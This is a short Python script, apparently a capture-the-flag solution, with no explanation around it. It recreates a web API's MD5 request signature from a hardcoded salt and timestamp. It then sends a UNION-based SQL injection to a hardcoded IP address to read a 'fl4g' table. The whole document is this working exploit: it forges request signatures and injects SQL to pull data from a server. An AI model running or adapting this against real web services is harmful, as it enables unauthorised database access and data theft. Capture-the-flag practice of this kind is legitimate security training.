import hashlib
import requests

def md5 (string):
    m = hashlib.md5()
    m.update(string)
    return m.hexdigest()

def run(val, time):
    intermed = md5("Start_here_")[6:16+6]
    string = intermed+val+" This_is_salt"+str(time)
    hash = md5(string)
    payload = {'id':val, 'hash':hash, 'time':time}
    return requests.get('http://202.120.7.213:11181/api.php',params=payload)

r = run("123 UNION ALL SELECT 0,hey FROM fl4g", "1489810337")
print(r)
print(r.text)